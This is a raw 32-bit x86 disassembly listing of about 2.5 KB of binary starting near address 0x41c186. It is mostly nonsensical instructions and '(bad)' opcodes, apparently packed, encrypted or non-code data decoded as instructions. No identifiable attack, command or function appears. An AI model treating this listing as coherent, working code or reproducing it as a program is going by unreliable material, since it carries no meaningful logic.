  41c186:	add    DWORD PTR [eax],eax
  41c188:	add    al,0x1
  41c18a:	add    BYTE PTR [eax],al
  41c18c:	enter  0x902d,0x7e
  41c190:	jp     0x41c1fa
  41c192:	sbb    ah,0x42
  41c195:	sbb    eax,0xc135c9e
  41c19a:	xchg   esi,eax
  41c19b:	daa    
  41c19c:	cmc    
  41c19d:	pop    esi
  41c19e:	jne    0x41c1bf
  41c1a0:	clc    
  41c1a1:	jnp    0x41c1b1
  41c1a3:	xchg   esp,eax
  41c1a4:	xor    eax,0xf7c2b9e5
  41c1a9:	ret    0x69d
  41c1ac:	mov    edi,0x1e19cd53
  41c1b1:	or     al,0x28
  41c1b3:	cs jge 0x41c21b
  41c1b6:	shl    DWORD PTR [esi+0x4b4d2f04],0x7c
  41c1bd:	mov    esp,ds
  41c1bf:	pop    ebx
  41c1c0:	les    edi,FWORD PTR [eax-0x4c]
  41c1c3:	rcr    DWORD PTR [ebp+esi*8+0x75257a21],1
  41c1ca:	and    esp,0x56
  41c1cd:	mov    esi,0x9f30e255
  41c1d2:	push   0xd81a8bff
  41c1d7:	adc    ebp,eax
  41c1d9:	xchg   ah,dl
  41c1db:	fld    TBYTE PTR [eax+0x54]
  41c1de:	mov    ds:0x44a0446f,eax
  41c1e3:	(bad)  
  41c1e4:	cli    
  41c1e5:	cdq    
  41c1e6:	mov    al,ds:0xd02b0aee
  41c1eb:	hlt    
  41c1ec:	stc    
  41c1ed:	addr16 jmp 0xadae0411
  41c1f3:	js     0x41c249
  41c1f5:	xchg   ebp,eax
  41c1f6:	adc    al,0x34
  41c1f8:	stos   DWORD PTR es:[di],eax
  41c1fa:	fild   DWORD PTR [eax]
  41c1fc:	popf   
  41c1fd:	loopne 0x41c272
  41c1ff:	push   ss
  41c200:	pop    ds
  41c201:	xchg   ebx,eax
  41c202:	jmp    0x75c9635c
  41c207:	mov    ss,WORD PTR [ebp+0x1f]
  41c20a:	enter  0x76c5,0x58
  41c20e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c20f:	sbb    bh,0x87
  41c212:	or     ebp,0xffffff98
  41c215:	push   ebx
  41c216:	jb     0x41c28d
  41c218:	push   0x42
  41c21a:	stc    
  41c21b:	(bad)  
  41c21d:	mov    ds:0xb6a3843f,al
  41c222:	pop    edi
  41c223:	clc    
  41c224:	scas   eax,DWORD PTR es:[edi]
  41c225:	cmp    ebp,esi
  41c227:	mov    ebp,0x9ee1f22f
  41c22c:	cwde   
  41c22d:	hlt    
  41c22e:	mov    cl,0xed
  41c230:	inc    edi
  41c231:	mov    BYTE PTR [ecx+0x2c84b974],al
  41c237:	aas    
  41c238:	or     BYTE PTR [ebx],dl
  41c23a:	xchg   ecx,eax
  41c23b:	and    al,0xb5
  41c23d:	or     BYTE PTR [edx+eax*2],dl
  41c240:	xor    al,0xe7
  41c242:	cmp    DWORD PTR [ebx],ebx
  41c244:	jns    0x41c257
  41c246:	dec    edi
  41c247:	sub    al,0x89
  41c249:	jmp    0x41c2c4
  41c24b:	push   ebx
  41c24c:	push   ebp
  41c24d:	lea    esi,ds:0x5a5053d3
  41c253:	cmp    eax,0xbf41557a
  41c258:	mov    ebx,0xedac7e84
  41c25d:	bound  esp,QWORD PTR [ecx+0x3f]
  41c260:	clc    
  41c261:	push   ss
  41c262:	out    0x9f,al
  41c264:	sub    BYTE PTR [ebx-0x25],0x38
  41c268:	pop    esp
  41c269:	or     al,0xed
  41c26b:	pushf  
  41c26c:	(bad)  
  41c26d:	imul   BYTE PTR [edi-0x638ad3c8]
  41c273:	jl     0x41c23c
  41c275:	loop   0x41c2d9
  41c277:	pop    edi
  41c278:	test   ecx,edi
  41c27a:	into   
  41c27b:	mov    dh,0xe9
  41c27d:	retf   0xd1b9
  41c280:	push   eax
  41c281:	dec    esp
  41c282:	or     al,0xfd
  41c284:	mov    ds:0xb4dc1421,al
  41c289:	dec    ecx
  41c28a:	js     0x41c242
  41c28c:	(bad)  
  41c28d:	aas    
  41c28e:	adc    eax,0x1a
	...
  41c2f3:	add    bl,dh
  41c2f5:	and    ebp,ecx
  41c2f7:	push   ebp
  41c2f8:	(bad)  
  41c2fa:	sti    
  41c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fc:	enter  0x1a95,0x14
  41c300:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c301:	icebp  
  41c302:	xchg   ebp,eax
  41c303:	loop   0x41c341
  41c305:	sub    eax,DWORD PTR [ecx]
  41c307:	add    BYTE PTR [ecx+eax*1],al
  41c30a:	add    BYTE PTR [eax],al
  41c30c:	out    0x45,eax
  41c30e:	adc    bl,BYTE PTR [esi]
  41c310:	add    eax,0x27ab4f95
  41c315:	loopne 0x41c31b
  41c317:	xor    BYTE PTR [edi],ah
  41c319:	shr    dh,1
  41c31b:	in     al,dx
  41c31c:	fcmovb st,st(7)
  41c31e:	ja     0x41c336
  41c320:	push   es
  41c321:	hlt    
  41c322:	out    0xb1,eax
  41c324:	mov    edx,0x1da3bc85
  41c329:	sub    bl,dh
  41c32b:	mov    esi,0xccb5f56b
  41c330:	ss jno 0x41c354
  41c333:	int    0x25
  41c335:	out    0xed,al
  41c337:	cmp    eax,0x507228ed
  41c33c:	out    dx,eax
  41c33d:	add    edx,DWORD PTR ds:0x96144d20
  41c343:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c344:	dec    BYTE PTR [esi]
  41c346:	imul   ecx,DWORD PTR [esi+0x57d57399],0x20
  41c34d:	neg    DWORD PTR [ecx+edx*4+0x3a4bd5d3]
  41c354:	add    al,0x21
  41c356:	iret   
  41c357:	gs cmc 
  41c359:	lock and DWORD PTR [eax],ebp
  41c35c:	or     dl,cl
  41c35e:	sub    al,ah
  41c360:	mov    BYTE PTR [ebx],cl
  41c362:	ja     0x41c3dd
  41c364:	sub    BYTE PTR ds:0x6d6e170e,0x81
  41c36b:	ins    DWORD PTR es:[edi],dx
  41c36c:	jecxz  0x41c35d
  41c36e:	jbe    0x41c3b0
  41c370:	pop    ss
  41c371:	mov    cl,0x5c
  41c373:	and    al,BYTE PTR [edx+0x26]
  41c376:	xchg   esi,eax
  41c378:	mov    es,eax
  41c37a:	cmp    DWORD PTR [ebp+0x48bb7132],edi
  41c380:	ret    
  41c381:	add    eax,0x92c6daad
  41c386:	mov    ch,BYTE PTR [ecx]
  41c388:	iret   
  41c389:	loopne 0x41c406
  41c38b:	dec    ebp
  41c38c:	jg     0x41c40d
  41c38e:	aaa    
  41c38f:	jno    0x41c3b6
  41c391:	cmp    DWORD PTR ds:0x91aa9083,0x368eb3df
  41c39b:	xor    esp,DWORD PTR [edx]
  41c39d:	ins    DWORD PTR es:[edi],dx
  41c39e:	adc    bh,BYTE PTR [eax]
  41c3a0:	push   edi
  41c3a1:	int3   
  41c3a2:	les    esi,FWORD PTR fs:[eax+0x16]
  41c3a6:	dec    ebx
  41c3a7:	sub    DWORD PTR [eax-0x7818ca15],esp
  41c3ad:	fwait
  41c3ae:	aas    
  41c3af:	pop    es
  41c3b0:	add    cl,BYTE PTR [esi+0x7eba03eb]
  41c3b6:	sbb    BYTE PTR [esi],dl
  41c3b8:	sbb    DWORD PTR [esi+0x16],edi
  41c3bb:	iret   
  41c3bc:	data16 (bad) 
  41c3bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3c1:	bound  ebx,QWORD PTR [ecx]
  41c3c3:	mov    esp,0x465d764d
  41c3c8:	call   0xcf2e6238
  41c3cd:	out    0xe1,eax
  41c3cf:	pop    es
  41c3d0:	mov    bl,0x80
  41c3d2:	call   0x8a2:0xed88b332
  41c3d9:	pop    esp
  41c3da:	or     cl,ah
  41c3dc:	sbb    ah,0xbf
  41c3df:	in     eax,dx
  41c3e0:	shr    DWORD PTR [ebx+ecx*4],cl
  41c3e3:	push   esi
  41c3e4:	stc    
  41c3e5:	add    esi,DWORD PTR [ebp+0x37fb4e64]
  41c3eb:	sbb    ebx,esp
  41c3ed:	repz jecxz 0x41c3f8
  41c3f0:	push   ds
  41c3f1:	bound  ecx,QWORD PTR [edx+ebx*2-0x62]
  41c3f5:	(bad)  
  41c3f6:	or     esi,ebx
  41c3f8:	(bad)  
  41c3fa:	lods   eax,DWORD PTR ds:[esi]
  41c3fb:	sub    dh,BYTE PTR [esi]
  41c3fd:	fdiv   QWORD PTR [esi-0x5d]
  41c400:	les    ecx,FWORD PTR ds:0xbb1540f5
  41c406:	jmp    0xdf935f4f
  41c40b:	hlt    
  41c40c:	push   edx
  41c40d:	cmp    eax,0x373f
	...
  41c472:	add    BYTE PTR [eax],al
  41c474:	push   ebx
  41c475:	and    BYTE PTR [eax+0x5faef3ae],ah
  41c47b:	std    
  41c47c:	mov    bl,0x35
  41c47e:	dec    ebp
  41c47f:	push   ecx
  41c480:	sub    DWORD PTR [ecx+0x4],ecx
  41c483:	in     eax,0x40
  41c485:	sub    al,0x1
  41c487:	add    BYTE PTR [ecx+eax*1],al
  41c48a:	add    BYTE PTR [eax],al
  41c48c:	jbe    0x41c4ce
  41c48e:	inc    ebx
  41c48f:	lods   al,BYTE PTR es:[esi]
  41c491:	jns    0x41c4d3
  41c493:	lods   eax,DWORD PTR ds:[esi]
  41c494:	fsubrp st(2),st
  41c496:	adc    ecx,DWORD PTR [ecx]
  41c498:	aas    
  41c499:	push   eax
  41c49a:	in     al,dx
  41c49b:	sbb    BYTE PTR [ecx+eax*1+0x1ddf0cdf],ch
  41c4a2:	hlt    
  41c4a3:	shl    DWORD PTR [esi+edi*8+0x78],cl
  41c4a7:	dec    esp
  41c4a8:	jecxz  0x41c4a8
  41c4aa:	int    0xb5
  41c4ac:	add    BYTE PTR [ebp-0x33],bl
  41c4af:	inc    edx
  41c4b0:	bound  ebx,QWORD PTR [ebx+0x602e8a0d]
  41c4b6:	mov    DWORD PTR [edi+0x2c16355a],esi
  41c4bc:	push   ebx
  41c4bd:	dec    esi
  41c4be:	jbe    0x41c529
  41c4c0:	push   eax
  41c4c1:	(bad)  
  41c4c2:	repnz in eax,dx
  41c4c4:	fnstsw WORD PTR [ebx-0x6a]
  41c4c7:	sbb    BYTE PTR [eax],bl
  41c4c9:	(bad)
  41c4cc:	xor    DWORD PTR [eax-0x4],edi
  41c4cf:	xor    eax,0xae317e78
  41c4d4:	arpl   WORD PTR [ebx-0x79f79893],di
  41c4da:	or     ecx,DWORD PTR [eax]
  41c4dc:	xor    ch,cl
  41c4de:	xchg   DWORD PTR [ebp-0x84cd0a3],eax
  41c4e4:	mov    esp,0xc471d280
  41c4e9:	das    
  41c4ea:	push   eax
  41c4eb:	ja     0x41c4e9
  41c4ed:	cmc    
  41c4ee:	ins    DWORD PTR es:[edi],dx
  41c4ef:	cmp    al,0x40
  41c4f1:	jns    0x41c4e2
  41c4f3:	sbb    ecx,DWORD PTR [esi+0x9]
  41c4f6:	test   eax,0xeb87c6f5
  41c4fb:	xor    BYTE PTR [ebx-0x7722c21c],bl
  41c501:	xor    eax,0x5ed9486b
  41c506:	std    
  41c507:	push   0xffffffb4
  41c509:	sbb    DWORD PTR [edx-0x66],0x22963d37
  41c510:	cmp    esp,DWORD PTR [ebp+ebx*4-0x77d5dee1]
  41c517:	mov    esp,0x12d1a2bd
  41c51c:	sbb    ah,BYTE PTR [ebx+0x56d73d93]
  41c522:	dec    edi
  41c523:	bound  esp,QWORD PTR [ecx]
  41c525:	hlt    
  41c526:	jmp    0x41c4ba
  41c528:	sbb    eax,0xed4de9f9
  41c52d:	nop
  41c52e:	or     dh,BYTE PTR [eax]
  41c530:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c531:	pop    ecx
  41c532:	jno    0x41c5aa
  41c534:	es fwait
  41c536:	shl    DWORD PTR [ecx],cl
  41c538:	in     eax,0x16
  41c53a:	mov    edx,0x6aac176b
  41c53f:	cld    
  41c540:	rcl    ch,cl
  41c542:	cdq    
  41c543:	lods   al,BYTE PTR ds:[esi]
  41c544:	jg     0x41c5bb
  41c546:	rol    bl,cl
  41c548:	sub    al,0xec
  41c54a:	cmp    DWORD PTR [eax],edi
  41c54c:	(bad)  
  41c54d:	pop    edx
  41c54e:	push   0xffffffff
  41c550:	call   DWORD PTR [ecx+0x4e]
  41c553:	xor    al,0x85
  41c555:	jb     0x41c585
  41c557:	mov    bh,0xd7
  41c559:	jmp    0x41c5aa
  41c55b:	sub    DWORD PTR [eax],0x25
  41c55e:	xor    BYTE PTR [ebp-0x786419e4],ch
  41c564:	int    0x89
  41c566:	dec    esi
  41c567:	xor    eax,0x3270a356
  41c56c:	mov    ds,edi
  41c56e:	test   eax,0xcc6e3b1b
  41c573:	inc    edx
  41c574:	je     0x41c509
  41c576:	push   eax
  41c577:	dec    ecx
  41c578:	shl    BYTE PTR [edx+0x7362a0b5],1
  41c57e:	adc    eax,DWORD PTR [ecx]
  41c580:	sbb    al,0x9e
  41c582:	xchg   edx,eax
  41c583:	pop    esi
  41c584:	stos   DWORD PTR es:[edi],eax
  41c585:	jo     0x41c59a
  41c587:	adc    BYTE PTR [edi+0x2b],cl
  41c58a:	shl    BYTE PTR [ebx],cl
  41c58c:	retf   0x838a
  41c58f:	sldt   WORD PTR [eax]
	...
  41c5f2:	add    BYTE PTR [eax],al
  41c5f4:	lds    esp,FWORD PTR [ebx]
  41c5f6:	xchg   ecx,eax
  41c5f7:	and    eax,0xe3f5b7f7
  41c5fc:	inc    ebx
  41c5fd:	and    ch,ch
  41c5ff:	call   0x2d44:0xfbb9e681
  41c606:	add    DWORD PTR [eax],eax
  41c608:	add    al,0x1
  41c60a:	add    BYTE PTR [eax],al
  41c60c:	mov    eax,0xd817e44c
  41c611:	mov    ds:0xe6ac76d1,eax
  41c616:	call   0x4b75:0x8e86be0b
  41c61d:	xor    ecx,DWORD PTR [ebx]
  41c61f:	pop    esi
  41c620:	jmp    0x9c7e34cc
  41c625:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c626:	sbb    eax,0x1c050447
  41c62b:	xchg   DWORD PTR [ebp-0xa3faa2e],eax
  41c631:	push   esp
  41c632:	or     BYTE PTR [esi-0x2dbf5224],0x15
  41c639:	cmp    bh,BYTE PTR [eax+ebx*4]
  41c63c:	and    dh,BYTE PTR [ebp-0x6b]
  41c63f:	imul   DWORD PTR [edi-0x1d]
  41c642:	scas   eax,DWORD PTR es:[edi]
  41c643:	in     al,dx
  41c644:	jo     0x41c65e
  41c646:	and    DWORD PTR ds:[edi],esi
  41c649:	sti    
  41c64a:	inc    edi
  41c64b:	add    al,0xb0
  41c64d:	jmp    0x41c60e
  41c64f:	and    dl,dl
  41c651:	pushf  
  41c652:	mov    dl,0xd3
  41c654:	fdivrp st(5),st
  41c656:	cmp    edx,edx
  41c658:	sub    BYTE PTR [esi],bl
  41c65a:	sub    al,0xdf
  41c65c:	ret    0x3f75
  41c65f:	mov    ah,0x13
  41c661:	add    dl,dh
  41c663:	inc    ecx
  41c664:	mov    edi,0x2fe912aa
  41c669:	jne    0x41c6a8
  41c66b:	repnz xchg esp,eax
  41c66d:	mov    bh,0x9e
  41c66f:	or     eax,0x3c989c19
  41c674:	loop   0x41c62d
  41c676:	test   eax,0xae0cfdc
  41c67b:	sbb    eax,0x3e6c84ad
  41c680:	add    eax,0xd2a9af18
  41c685:	mov    eax,ds:0xf121197d
  41c68a:	mov    esi,0xacd37feb
  41c68f:	repnz push eax
  41c691:	dec    edx
  41c692:	or     al,0xdc
  41c694:	int3   
  41c695:	hlt    
  41c696:	icebp  
  41c697:	pop    ecx
  41c698:	dec    edi
  41c699:	in     eax,0x45
  41c69b:	push   0x7e478128
  41c6a0:	test   DWORD PTR [esi+0x51],ebx
  41c6a3:	(bad)  
  41c6a4:	ds pop esp
  41c6a6:	add    ebp,DWORD PTR cs:[edx-0x80]
  41c6aa:	jle    0x41c685
  41c6ac:	cmp    eax,0xf705233c
  41c6b1:	sbb    edi,DWORD PTR [ecx-0x20]
  41c6b4:	sub    ah,ah
  41c6b6:	add    BYTE PTR [ebx],cl
  41c6b8:	call   0xed28:0x7612e4bd
  41c6bf:	mov    eax,ds:0x2695f024
  41c6c4:	sub    eax,0x6500735e
  41c6c9:	jmp    0x7e1f:0xc3b3ffc
  41c6d0:	cwde   
  41c6d1:	pop    esi
  41c6d2:	int3   
  41c6d3:	stos   BYTE PTR es:[edi],al
  41c6d4:	push   0xffffffdc
  41c6d6:	mov    WORD PTR [eiz*2+0x20ea9755],cs
  41c6dd:	mov    esi,DWORD PTR ds:0x9d5e6664
  41c6e3:	shr    BYTE PTR [ecx],0x47
  41c6e6:	push   0xa0539e3f
  41c6eb:	sbb    edx,DWORD PTR [ebp-0x4eec7e31]
  41c6f1:	clc    
  41c6f2:	sbb    edx,edi
  41c6f4:	add    edx,ebp
  41c6f6:	push   ss
  41c6f7:	mov    cl,BYTE PTR [esp+ebx*8-0x6b]
  41c6fb:	sbb    DWORD PTR [edx+0x67],edx
  41c6fe:	rcr    DWORD PTR [ecx+ebp*1],cl
  41c701:	jmp    0x7715:0x7d73e421
  41c708:	or     dh,BYTE PTR [eax-0x5845a6b6]
  41c70e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c70f:	adc    DWORD PTR [eax],eax
	...
  41c771:	add    BYTE PTR [eax],al
  41c773:	add    dl,bl
  41c775:	add    edx,eax
  41c777:	xchg   bl,bl
  41c779:	(bad)  
  41c77a:	ficomp WORD PTR [ebp-0xf]
  41c77d:	cmp    DWORD PTR [esi],esi
  41c77f:	lahf   
  41c780:	loopne 0x41c758
  41c782:	jo     0x41c732
  41c784:	dec    eax
  41c785:	add    DWORD PTR cs:[eax],eax
  41c788:	add    al,0x1
  41c78a:	add    BYTE PTR [eax],al
  41c78c:	and    ebp,ebx
  41c78e:	add    ecx,esp
  41c790:	cld    
  41c791:	xchg   esi,eax
  41c792:	or     ebp,DWORD PTR [ebx+0x7eac2851]
  41c798:	add    al,0x2f
  41c79a:	out    0xd,eax
  41c79c:	loop   0x41c7df
  41c79e:	and    edi,DWORD PTR [edx+0x1e]
  41c7a1:	sbb    ah,al
  41c7a3:	outs   dx,DWORD PTR ds:[esi]
  41c7a4:	add    bl,bh
  41c7a6:	shr    BYTE PTR [edx-0x4],0xe9
  41c7aa:	sar    DWORD PTR [edi-0x5d112068],cl
  41c7b0:	lea    edx,[esi+0x25]
  41c7b3:	jl     0x41c77e
  41c7b5:	and    ebx,DWORD PTR [ebx+0x61fbf74d]
  41c7bb:	or     ecx,DWORD PTR [ebx-0x38]
  41c7be:	inc    esi
  41c7bf:	sub    BYTE PTR [ecx+0x1cee8d16],dl
  41c7c5:	sub    eax,0x79853083
  41c7ca:	mov    edi,0x932e5841
  41c7cf:	rol    DWORD PTR [edx],1
  41c7d1:	iret   
  41c7d2:	mov    ds,WORD PTR [ebp+0x73]
  41c7d5:	dec    edi
  41c7d6:	in     eax,0x5b
  41c7d8:	shl    DWORD PTR [ecx-0x428f9691],cl
  41c7de:	sub    eax,0x54cffff
  41c7e3:	les    ebx,FWORD PTR [ecx+ebp*2]
  41c7e6:	push   ebx
  41c7e7:	gs (bad) 
  41c7ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c7eb:	jmp    0x5fc:0xbc06412e
  41c7f2:	mov    BYTE PTR [ecx-0x29b59076],dl
  41c7f8:	jp     0x41c817
  41c7fa:	cld    
  41c7fb:	mov    al,ds:0x61ae3295
  41c800:	ds jecxz 0x41c797
  41c803:	loopne 0x41c849
  41c805:	test   al,0x3e
  41c807:	loop   0x41c7ca
  41c809:	loop   0x41c818
  41c80b:	mov    bl,0xe0
  41c80d:	push   edi
  41c80e:	(bad)  
  41c80f:	out    dx,eax
  41c810:	leave  
  41c811:	xor    BYTE PTR [edx+0x22],bl
  41c814:	imul   edi,ebx,0x2f
  41c817:	mov    ebp,0x61252187
  41c81c:	adc    esp,esi
  41c81e:	push   ecx
  41c81f:	sbb    al,0x39
  41c821:	cwde   
  41c822:	frstor [edx+ebp*8]
  41c825:	sbb    al,0x32
  41c827:	lods   eax,DWORD PTR ds:[esi]
  41c828:	adc    eax,0x85000495
  41c82d:	les    ebp,FWORD PTR [ecx+0x6a]
  41c830:	add    esi,DWORD PTR [ebp-0x28e65407]
  41c836:	mov    esp,0xe6c3694c
  41c83b:	shl    DWORD PTR [eax],1
  41c83d:	push   ecx
  41c83e:	out    0x6b,eax
  41c840:	leave  
  41c841:	hlt    
  41c842:	dec    ebp
  41c843:	adc    DWORD PTR [edx+ecx*1+0x17],ebx
  41c847:	adc    eax,0xb8a69fbf
  41c84c:	inc    esp
  41c84d:	cmp    bh,BYTE PTR [eax-0xb]
  41c850:	lods   eax,DWORD PTR ds:[esi]
  41c851:	adc    edx,DWORD PTR [ecx+0x4078ad99]
  41c857:	es pop es
  41c859:	xor    al,BYTE PTR [ebp+0x60]
  41c85c:	(bad)  
  41c85d:	and    BYTE PTR gs:[edi+0x3a],bh
  41c861:	sub    dl,BYTE PTR [edx+0x6a4cf3a5]
  41c867:	xor    cl,al
  41c869:	ins    DWORD PTR es:[edi],dx
  41c86a:	aad    0x89
  41c86c:	add    esp,edx
  41c86e:	jg     0x41c8c6
  41c870:	mov    cl,0xdf
  41c872:	sbb    ebp,DWORD PTR [eax-0x5a93f485]
  41c878:	and    ebp,eax
  41c87a:	sub    BYTE PTR [ecx-0x39],dh
  41c87d:	or     eax,0x1bbeb00
  41c882:	xor    edx,edi
  41c884:	xchg   ecx,eax
  41c885:	cmc    
  41c886:	iret   
  41c887:	mul    BYTE PTR [esi+0x51]
  41c88a:	xor    edx,esp
  41c88c:	fwait
  41c88d:	jle    0x41c94e
	...
  41c8f3:	add    BYTE PTR [ebx+0x34],ah
  41c8f6:	lods   eax,DWORD PTR ds:[esi]
  41c8f7:	xor    al,0xff
  41c8f9:	mov    ebp,0x291877fb
  41c8fe:	cmp    eax,DWORD PTR [ecx]
  41c900:	daa    
  41c901:	fcom   DWORD PTR [ebp+0x12f4c05]
  41c907:	add    BYTE PTR [ecx+eax*1],al
  41c90a:	add    BYTE PTR [eax],al
  41c90c:	adc    al,0xc7
  41c90e:	jns    0x41c8ac
  41c910:	out    dx,eax
  41c911:	in     al,0xad
  41c913:	push   ds
  41c914:	cdq    
  41c915:	rcl    dl,1
  41c917:	cmp    esp,DWORD PTR [esi+0x763d59df]
  41c91d:	retf   
  41c91e:	xlat   BYTE PTR ds:[ebx]
  41c91f:	mov    ah,0xf7
  41c921:	dec    esi
  41c922:	xchg   esp,eax
  41c923:	ds sbb eax,0xff825af0
  41c929:	mov    bh,0x2b
  41c92b:	iret   
  41c92c:	cdq    
  41c92d:	sbb    edi,esi
  41c92f:	or     al,0xcb
  41c931:	dec    esi
  41c932:	popf   
  41c933:	test   DWORD PTR [esi+esi*4-0x48c2e626],ebx
  41c93a:	pop    esp
  41c93b:	(bad)  
  41c93c:	mov    edi,0x8e41adc0
  41c941:	retf   0xb526
  41c944:	mov    DWORD PTR [ecx],ecx
  41c946:	fdiv   QWORD PTR [ecx]
  41c948:	push   edi
  41c949:	jge    0x41c99c
  41c94b:	daa    
  41c94c:	(bad)  
  41c94d:	(bad)  
  41c94e:	aaa    
  41c94f:	jae    0x41c989
  41c951:	xchg   ecx,eax
  41c952:	enter  0x4b7c,0x8b
  41c956:	mov    BYTE PTR [ebx],dh
  41c958:	mov    cl,BYTE PTR [edi-0x5bceb021]
  41c95e:	ins    DWORD PTR es:[edi],dx
  41c95f:	pop    edi
  41c960:	xchg   dl,ch
  41c962:	cmc    
  41c963:	xor    DWORD PTR [esi-0x18192194],ecx
  41c969:	les    esp,FWORD PTR [eax-0x2bf7a1f3]
  41c96f:	adc    ch,BYTE PTR [eax+0x67]
  41c972:	cwde   
  41c973:	jne    0x41c93f
  41c975:	sub    esp,DWORD PTR [esi+ebp*2+0x68]
  41c979:	jo     0x41c906
  41c97b:	sbb    eax,0x523bf7d8
  41c980:	add    ebx,DWORD PTR [edx-0x698a0c5e]
  41c986:	jne    0x41c963
  41c988:	je     0x41c98c
  41c98a:	bound  ecx,QWORD PTR [edi+0xbcc101d]
  41c990:	xor    BYTE PTR [ecx+0x49],0x56
  41c994:	retf   0xb783
  41c997:	mov    ds,edx
  41c999:	adc    DWORD PTR [edi-0x2f],ebx
  41c99c:	pop    ebp
  41c99d:	dec    esp
  41c99e:	pop    eax
  41c99f:	stos   DWORD PTR es:[edi],eax
  41c9a0:	out    0x5e,al
  41c9a2:	mov    dl,0x98
  41c9a4:	inc    edx
  41c9a5:	add    bh,BYTE PTR [ebp-0x58]
  41c9a8:	inc    edi
  41c9a9:	mov    ds:0xc631c2f7,eax
  41c9ae:	das    
  41c9af:	sbb    edi,DWORD PTR [ebx-0x2c]
  41c9b2:	pop    esp
  41c9b3:	shl    DWORD PTR [eax],0x6a
  41c9b6:	mov    ch,BYTE PTR ds:0xd385119e
  41c9bc:	jae    0x41c9a3
  41c9be:	(bad)  
  41c9bf:	cmp    ebp,ecx
  41c9c1:	xlat   BYTE PTR ds:[ebx]
  41c9c2:	popa   
  41c9c3:	xor    al,0x45
  41c9c5:	xor    BYTE PTR [eax],dh
  41c9c7:	or     al,0xf2
  41c9c9:	fldcw  WORD PTR [ebx]
  41c9cb:	adc    dl,bh
  41c9cd:	cmc    
  41c9ce:	xor    BYTE PTR [esi-0x75d612e7],dh
  41c9d4:	dec    edx
  41c9d5:	inc    ebp
  41c9d6:	stc    
  41c9d7:	cmp    esi,ebp
  41c9d9:	add    ebx,ebx
  41c9db:	(bad)  
  41c9dc:	(bad)  
  41c9dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c9de:	call   0xb5c1930d
  41c9e3:	pop    ebx
  41c9e4:	mov    WORD PTR [eax],fs
  41c9e6:	mov    eax,0xa037643b
  41c9eb:	adc    al,BYTE PTR [esi+0x6]
  41c9ee:	jl     0x41c9a7
  41c9f0:	pop    ss
  41c9f1:	pop    eax
  41c9f2:	(bad)  
  41c9f3:	adc    al,0x65
  41c9f5:	mov    ah,0x59
  41c9f7:	daa    
  41c9f8:	xchg   ebx,eax
  41c9f9:	and    eax,0xe8b592ce
  41c9fe:	pop    es
  41c9ff:	repnz push eax
  41ca01:	in     al,0x14
  41ca03:	push   esi
  41ca04:	push   cs
  41ca05:	cmc    
  41ca06:	sub    al,0xed
  41ca08:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ca09:	je     0x41c9d4
  41ca0b:	sub    ah,dh
  41ca0d:	ret    
  41ca0e:	xor    eax,0x1f
	...
  41ca73:	add    al,dh
  41ca75:	retf   0xfc94
  41ca78:	mov    esi,0xc1cef8fe
  41ca7d:	or     al,BYTE PTR [ebx+0x0]
  41ca80:	dec    esp
  41ca81:	scas   al,BYTE PTR es:[edi]
  41ca82:	push   ecx
  41ca83:	outs   dx,BYTE PTR ds:[esi]
  41ca84:	push   eax
  41ca85:	xor    BYTE PTR [ecx],al
  41ca87:	add    BYTE PTR [ecx+eax*1],al
  41ca8a:	add    BYTE PTR [eax],al
  41ca8c:	aas    
  41ca8d:	or     eax,0x86e83a14
  41ca92:	out    0xf3,eax
  41ca94:	je     0x41ca65
  41ca96:	inc    eax
  41ca97:	mov    esi,0x64c41121
  41ca9c:	repz and DWORD PTR [ebx-0x1a5c5660],edx
  41caa3:	push   DWORD PTR [ecx-0x1a2d1281]
  41caa9:	outs   dx,BYTE PTR ds:[esi]
  41caaa:	sbb    bh,BYTE PTR es:0xe7031ffc
  41cab1:	in     al,dx
  41cab2:	call   0xa263:0x78d72dda
  41cab9:	retf   0xafa4
  41cabc:	outs   dx,BYTE PTR ds:[esi]
  41cabd:	add    al,0x3a
  41cabf:	or     al,0x2
  41cac1:	gs pop esp
  41cac3:	imul   ecx,DWORD PTR [eax],0xa267df9
  41cac9:	(bad)  
  41caca:	xchg   ebx,eax
  41cacb:	xor    dh,BYTE PTR [edi+0x1d]
  41cace:	inc    eax
  41cacf:	cld    
  41cad0:	mov    edx,0xe587becf
  41cad5:	cmp    ebp,DWORD PTR [esi+ebp*8+0x46]
  41cad9:	adc    DWORD PTR [edi-0x10558d49],0xffffffc3
  41cae0:	cmp    esi,ecx
  41cae2:	pop    es
  41cae3:	ins    DWORD PTR es:[edi],dx
  41cae4:	bswap  esp
  41cae6:	push   esi
  41cae7:	test   al,0x86
  41cae9:	aad    0x32
  41caeb:	out    dx,al
  41caec:	(bad)  
  41caed:	out    dx,eax
  41caee:	lds    ecx,FWORD PTR [ecx+ecx*4+0x4d997145]
  41caf5:	and    dl,bh
  41caf7:	pop    esi
  41caf8:	xor    eax,0x36ebad
  41cafd:	mov    edi,DWORD PTR [esp+edi*8-0x1a990773]
  41cb04:	dec    esi
  41cb05:	aam    0xe7
  41cb07:	push   0x89ed24ec
  41cb0c:	dec    esi
  41cb0d:	mov    ds:0xc9053aa6,eax
  41cb12:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cb13:	bound  edi,QWORD PTR [ebp-0x2bbe0edf]
  41cb19:	pop    edx
  41cb1a:	pop    ecx
  41cb1b:	inc    edi
  41cb1c:	iret   
  41cb1d:	data16 cmp BYTE PTR [ebx],bl
  41cb20:	pop    es
  41cb21:	call   0x301c:0xe88433de
  41cb28:	and    bh,cl
  41cb2a:	inc    esp
  41cb2b:	in     al,dx
  41cb2c:	jecxz  0x41cb70
  41cb2e:	lahf   
  41cb2f:	stos   DWORD PTR es:[edi],eax
  41cb30:	fimul  WORD PTR [ecx+eiz*1+0x74e168f6]
  41cb37:	dec    esp
  41cb38:	sub    eax,0xc4887290
  41cb3d:	nop
  41cb3e:	ja     0x41cbbf
